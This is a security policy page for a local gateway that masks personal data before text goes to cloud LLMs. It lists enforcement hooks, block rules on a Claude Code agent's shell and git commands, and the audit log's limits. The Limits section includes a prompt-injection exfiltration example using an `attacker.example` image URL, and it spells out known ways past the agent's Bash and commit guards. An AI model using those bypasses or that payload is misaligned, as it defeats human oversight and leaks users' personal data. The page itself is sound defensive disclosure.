# Security

This page states what SafeGuard Gateway is designed to do, how the repository
enforces it today, and the limits a customer should know about. It will grow
with each phase; the threat model gets its full review before the first pilot.

## Design goals

1. Detected personal data leaves the machine only as placeholders. Detection and masking
   run locally (Presidio, spaCy, GLiNER, regex with checksums).
2. `gateway/cloud/` is the only package allowed to open an outbound
   connection, and only to the upstream the user configured. The detection
   engine is not allowed any network, process or dynamic-import code. Static
   checks and socket-blocked tests enforce this; they match names, so the
   limits below apply.
3. The placeholder map is kept in memory, or encrypted with a per-session key
   from the OS keychain, and is deleted when the session ends (ADR 0002).
4. API keys and the audit HMAC key live in the OS keychain, never in files.
5. The audit log stores hashes, counts, timestamps and the upstream host. It
   never stores raw or masked text.

## What enforces this today

| Control | Where it runs |
|---------|---------------|
| AST check of every module under `gateway/` except `gateway/cloud/`: network modules and LLM SDKs everywhere; also process, dynamic-import and cloud/proxy imports in the engine | Claude Code hook on every edit, git pre-commit, CI |
| Tests run with sockets disabled (`pytest-socket`) | every test run |
| License check of the runtime dependency closure, extras included, on Linux on every push and on macOS and Windows only on version tags or manual dispatch; PyMuPDF and pdftext denied by name, also when named by a git URL, wheel or sdist file, directory, `uvx`/`uv tool`/`uv run --with` or a requirements file | Claude Code hook before and after installs, CI |
| Scan for keys (detect-secrets) and identifier-shaped data | Claude Code hook before commits; git pre-commit on staged files; CI on every tracked file |
| Commit gate: the Claude Code hook refuses a command that runs git next to `--no-verify` (or an abbreviation), `-n`, `hooksPath` or `GIT_CONFIG_*` outside the commit message, including inside `bash -c` and `$(...)`; it treats every git alias call as a commit and refuses commits while any alias holds `--no-verify`, `-n` or `hooksPath` | Claude Code hook before Bash |
| bash-guard: no `rm -rf`, `curl`/`wget` only to loopback (every non-option word counts as a host; `--proxy` must be loopback; `-K`, `--config`, `--resolve`, `--connect-to`, `wget -i/-e` refused), no git settings or variables that run commands (`core.sshCommand`, `alias.x=!...`, `GIT_SSH_COMMAND`, `GIT_CONFIG_*`), no `git push` to a URL, no `gh gist create`; it looks through wrappers with option values (`sudo -u root`, `timeout -s KILL 5`, `env -C dir`), `bash -c`, `eval`, `find -exec`, `$(...)` and backticks | Claude Code hook before Bash |
| Permission list: only named commands run without a prompt (pytest, ruff, ty, `python -m tools.*`, `safeguard`, uv sync/add/lock, git status/diff/log/show/add/commit, push to `origin claude/*`); `gh gist`, `gh api`, `git -c` and `git push http*` are denied | `.claude/settings.json` |
| Proxy: refuses to bind anywhere but 127.0.0.1; Host, Origin, content-type and body-size checks before any route; an integration test asserts no Faker value reaches the upstream body | `safeguard serve` start-up, every request, every test run |
| Bandit, pip-audit, Semgrep, zizmor | CI on every push |
| Redacted document copies (`safeguard mask FILE -o OUT`, ADR 0018): a DOCX copy keeps only allowlisted elements and attributes per part; XLSX copies drop tables, filter criteria, sort state, scenarios and custom number formats; EML copies keep only From/To/Cc/Subject and the MIME structure; a PDF copy is rebuilt from the masked text; DOCX and XLSX copies are refused if they would hold an unexpected zip member. Tests built with Faker check that no original value is in any zip member's raw bytes, the .eml bytes or the PDF's decompressed streams | every `mask` of a document; every test run |
| Document input limits: .docx and .xlsx over 200 MB uncompressed or 10,000 zip members are refused before they are opened; malformed XML exits 2 with a reason; OCR temporary files go to an owner-only directory removed after each call | every `mask` of a document |
| Model downloads (`safeguard models pull`): pinned SHA-256 per file; redirects only over https to a fixed list of hosts; a per-file byte cap; partial downloads deleted; a model counts as installed only with a completion marker for its current pin (ADR 0006, amended) | every `models pull`, `models list` and model load |

## Limits

- Detection is never 100%. Structured identifiers (card numbers, IBANs, SSNs,
  phone numbers) are checked with checksums and format rules. Names, addresses
  and free-text health details are statistical; the measured recall per entity
  type will be published in [BENCHMARKS.md](BENCHMARKS.md). A human review step
  before sending and a customer list of names that are always masked cover part
  of the gap.
- Pseudonymised is not anonymised. Under GDPR Art. 4(5), masked text plus the
  map is still personal data. That is why the map never leaves the device.
- The cloud model still sees the shape of the problem. A masked contract is
  still recognisably a contract about a dispute. For clients who cannot accept
  that, the local Ollama tier keeps everything on the machine.
- Restoring values can fail. A model may rewrite `[PERSON_1]` as "the client".
  The gateway shows such placeholders to the user instead of guessing (ADR 0003).
- A value is never restored inside a link, so links in answers can show
  placeholders. A pasted document can ask the model to end its answer with an
  image such as `![s](https://attacker.example/p.png?d=[EMAIL_1])`; restoring
  the email there would let a Markdown client send it to that host without a
  click. Placeholders in bare URLs, Markdown link and image targets, link
  reference definitions, autolinks and HTML attribute values are left as
  written and counted as unresolved (ADR 0003 amendment 1). Detecting these
  contexts errs towards "inside", so a placeholder next to some link-like text
  may also stay visible. A value the model writes out itself, rather than as a
  placeholder, is outside this rule: it was never masked.
- Russian and Armenian coverage is weaker than English, and it is measured
  separately.
- Armenian text, and text in any alphabet other than Latin and Cyrillic, goes
  to a multilingual GLiNER model (ADR 0015) for people, organisations, places,
  addresses and dates of birth. Its recall on Armenian is not measured: no
  labelled Armenian dataset exists, and the model was fine-tuned on English,
  French, German, Spanish, Portuguese and Italian PII only. A spot check on
  invented text found a full name, a village, a town and a company, but at
  scores as low as 0.50 (the default threshold), so names can be missed, and
  a span may take in the next word (the words for "village" or "in the city"
  after a place name). The
  customer's gazetteer remains the dependable way to mask known Armenian
  clients. Plain dates (other than dates of birth) are not labelled by GLiNER,
  and without `safeguard models pull` Armenian text gets structured
  identifiers and the gazetteer only, with a warning.
- The Russian NER model sometimes misses a name at the start of a sentence
  or splits it (observed in Phase 1b testing). Names mid-sentence are found
  more reliably; the gazetteer covers known clients either way.
- Each line goes to the model of its dominant alphabet, and neighbouring lines
  of one alphabet are read together, so a Russian name inside an English line
  is read by the English model (ADR 0016). A line that also holds letters of a
  script with no spaCy model (Armenian, Greek and others) is read by GLiNER as
  well.
- Names written in capitals are handled by a heuristic. A line in which more
  than 70% of the letters are capitals is title-cased before the models read
  it, because both models take case as a cue. Inside other lines, two or more
  neighbouring words in capitals (three letters or more each) are title-cased
  too. A single word in capitals inside a lower-case line is read as written
  and is found less often; in a heading in capitals, or an acronym pair such as
  "ACME LLC", ordinary words may be masked as names.
- Dates are found by a format recognizer in every language: numeric forms
  (`12.03.1985`, `03/12/1985`, `1985-03-12`, `12.03.85`) and English or
  Russian month names (`12 March 1985`, `March 12, 1985`, `12 марта 1985`,
  `«12» марта 1985`, `12-MAR-1985`), including ranges and lists written
  without spaces. Digits of other scripts (full width, Arabic-Indic) are read
  as ASCII digits by every recognizer.
  Other forms (a Russian date without a year, Roman-numeral months, "the
  12th") are found only by the English model, and only in English text: the
  Russian model has no date label.
- Without the NER models installed (`safeguard models pull`), names,
  organisations and places are not detected, nor dates in forms the date
  recognizer does not read; `safeguard scan` says so.
- OCR mistakes are not corrected. If a scan turns a digit into a look-alike
  letter ("O" for "0"), the card or SSN no longer passes its checksum or format
  and is not found. Reading letters as digits would also turn ordinary words
  into candidates, so this waits for real OCR samples to measure against
  (ADR 0013).
- A redacted copy of a document reduces exposure; it is not proof that the file
  is clean. A value the detector missed is copied like any other text. In a
  DOCX copy, font names and the values of allowed formatting attributes are
  kept without checking them against their schema types, so a hand-crafted
  file can still hide text there. Equations, text boxes, images and unknown
  elements are removed from DOCX copies, and from what the model reads, so the
  user may need the original for them. XLSX copies keep what openpyxl models
  unless ADR 0018 lists it as removed (for example font names and sheet
  protection hashes). The full list is in ADR 0018.
- The size caps bound what is decompressed, not memory: a document just under
  200 MB uncompressed can still need several times that in memory to parse.
- OCR runs Tesseract on the page image through temporary files. They live in
  an owner-only directory that is removed after each call; if the process is
  killed, that directory stays behind until the user deletes it.
- Long unbroken runs of numbers are slow. Every possible group of digits is
  checked for every identifier type, so 100 KB of single-spaced digits takes
  several seconds instead of under one. Ordinary documents are not affected;
  splitting such runs is deferred (ADR 0013).
- Long phone lists are slow. Phone numbers are matched once per configured
  region, nine by default, so a 100 KB directory of about 3,300 contacts takes
  around 3 seconds. Configuring only the regions a customer needs reduces this;
  a single-pass matcher is deferred (ADR 0013).
- The audit log is tamper-evident, not tamper-proof. See the next section.
- The local proxy (`safeguard serve`, ADR 0019) listens on 127.0.0.1 only and
  refuses other Host headers, browser origins that are not allowed, non-JSON
  POSTs and bodies over 4 MiB. It also caps what one client or upstream can
  make it hold: 50,000 values per `/mask` session (then a 413), 16 MiB per
  non-streamed upstream answer (then a 502) and 1 MiB per streamed line or
  event (then an error event), and it detects outside the session lock, so a
  slow request does not stall the others (ADR 0019 amendment 1). Any program
  running as the same user can still
  call it, as it can read that user's files and keychain. It is a convenience
  boundary against the network and web pages, not against local malware.
- The proxy forwards text only. Requests with images, files, audio or tool
  calls are refused, not masked (ADR 0019).
- Within one request, the proxy detects in every message (system prompt and
  all turns) before masking any, so a value found in one message is also
  masked where another message of the same request holds it in a form
  detection alone misses, such as an SSN glued into a file name (verified by
  `tests/integration/proxy/test_known_values.py`, ADR 0014 amendment 1). A
  value that detection misses in every message of the request is still sent
  as written; the mapping does not carry over between requests.
- `/mask` returns the session's placeholder map to the caller, because the
  extension restores answers itself (ADR 0002 point 2). The map is personal
  data; the caller must keep it in memory and drop it with the session.
- Upstream requests go only to the configured base URL, over HTTPS unless it
  is this machine, without following redirects and ignoring proxy settings in
  the environment (ADR 0020). A corporate HTTPS proxy is not supported yet.
- Pilot installers are unsigned (see [INSTALL.md](INSTALL.md)).
- The repository guards match names, not behaviour. Code that builds module
  names at run time can get past the no-egress check. CI and code review are
  the backstops (ADR 0010).
- The Bash guards read the command line, not what it does when it runs. Known
  ways past them: a command built at run time (`$x`, `$'\x63url'`, base64 piped
  to `sh`), a script file that is written first and run later, `env -S`,
  wrappers they do not know (`flock`, `taskset`), sudo's own `VAR=value`,
  git plumbing that writes commits without hooks (`commit-tree`,
  `update-ref`), and variables exported in an earlier shell. The commit gate
  scans the project directory Claude Code was started in, so a commit made in
  another worktree relies on that worktree's git pre-commit hook. The git
  pre-commit hook, CI over every tracked file, and the cloud session's network
  policy are the backstops.
- The commit gate errs towards refusing: a command that runs git and mentions
  `hooksPath` or `--no-verify` outside a commit message is refused, and so are
  all commits while a git alias with `-n` exists.

## What the audit log proves, and what it does not

The audit log (`~/.safeguard/audit.db`, ADR 0021 and 0022) has one row per
request `safeguard serve` sends upstream, including requests that ended in an
upstream error, a timeout, a broken stream or a client that left: time,
upstream host, model, how many values of each type were masked, a sha256 of
the masked payload, bytes sent, the upstream status (0 when none came back),
whether the upstream is on this machine, and a sha256 of the session id (empty
for chat requests). It never stores raw or masked text; tests search every
cell and every byte of the file for it, including after real requests through
the proxy. `serve` refuses to start without the keychain or with a log that
fails verification, unless started with `--no-audit`, which writes no log at
all. The row is written after the answer; if a write fails, the proxy
forwards nothing more until restarted. Each row
is chained to the previous one by a hash and signed with an HMAC under a
device key kept in the OS keychain.

What `safeguard audit verify` can show, when run with this device's key:

- a row was edited, deleted, moved, or inserted, or comes from another
  device's log, by someone who did not have the device key. It names the first
  row affected and why;
- the newest rows were deleted (an HMACed head record names the newest row);
- rows removed by retention went through `safeguard audit purge`, which
  leaves a signed checkpoint and refuses to purge a log that fails
  verification.

What it cannot show:

- **Someone with the device key and write access can rebuild the chain.** Any
  program running as the same OS user can usually read the key from the
  keychain, then rewrite rows and re-sign everything after them. The log then
  verifies. Tamper evidence holds only against people and programs that cannot
  get the key.
- **Deleting the whole file, or putting back an older copy of it, is not
  detected on this machine.** A new log simply starts. Comparing the chain
  head in an earlier export with the current log reveals a rollback, so
  customers should keep periodic exports (`safeguard audit export`) somewhere
  the user cannot change.
- **Timestamps come from the local clock**, which the user can change. They are
  not trusted timestamps.
- **A third party cannot check the HMACs without the device key**, and holding
  the key would let them forge rows. Without it they can still recompute every
  row hash and check the links in an export.
- Purged rows are overwritten inside the database file, but copies in
  backups, filesystem snapshots or SSD wear-levelling are outside its reach.
- If the log is broken, the gateway refuses to write to it, and the proxy
  refuses to start, or stops forwarding, until the file is moved aside (and
  kept as evidence).

The log is evidence of what this gateway sent. It does not show what other
software on the machine sent, or what the user pasted into a cloud service
directly.

Compliance with GDPR, HIPAA or any other regime remains the customer's
responsibility. The gateway provides controls and evidence for it.

## Reporting a vulnerability

Contact the maintainer privately. Do not open a public issue, and do not
include real personal data in the report.
